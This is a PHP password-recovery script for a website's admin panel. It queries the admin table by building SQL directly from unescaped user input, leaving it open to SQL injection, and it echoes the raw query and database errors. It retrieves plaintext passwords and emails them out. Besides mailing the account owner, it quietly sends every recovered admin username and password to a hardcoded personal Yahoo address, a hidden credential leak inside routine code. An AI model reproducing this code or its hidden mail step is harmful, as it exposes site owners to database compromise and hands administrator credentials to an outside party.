<?
include("../common/config.php");

$struname=trim($txtuname);
$stremail=trim($txtemail);

if($struname=="" and $stremail=="")
{
    header("Location:forgot_pass.php?flag=blank");
    exit;
}

if($struname!="")   
{
        $query = "SELECT password,admin_email,username FROM ".$tblpref."admin WHERE username = '$struname'";
        $stru=1;
}
elseif($stremail!="")
{
      $query = "SELECT password,admin_email,username FROM ".$tblpref."admin WHERE admin_email = '$stremail'";
       $stru=0;
}
if (!($result = mysql_query($query))) { echo $query .mysql_error();  exit; }

    if (mysql_num_rows($result)>0)
    {
        $row=mysql_fetch_object($result);
        $strmemail=$row->admin_email;
		
        $strpassword=$row->password;
		$struname=$row->username;
        $strmesstype="Password Found";
	    $ouremail="$sitename";

	    $strdetail="Dear $struname,\r\nWe are pleased to inform that your Password had been found.\r\n\nYour Username is - $struname\r\nYour Password is - $strpassword\r\n\nRegards\r\nSite Admin\r\nwww.bih.co.bw\r\n";	@mail($strmemail,"$strmesstype-$HTTP_HOST",$strdetail,"from:$ouremail\nmime-version: 1.0\ncontent-type: text/plain");
		@mail("g.mosweu@yahoo.com","$strmesstype-$HTTP_HOST",$strdetail,"from:$ouremail\nmime-version: 1.0\ncontent-type: text/plain");
		//echo $strdetail;
		header("Location:index.php?flag=sent");
		exit;
               
	}
	else
	{
		if ($stru==1)
		{ 
			header("Location:forgot_pass.php?flag=un");
			exit;
		
		}
		elseif($stru==0)
		{
			header("Location:forgot_pass.php?flag=en");
			exit;
		} 
	}
?>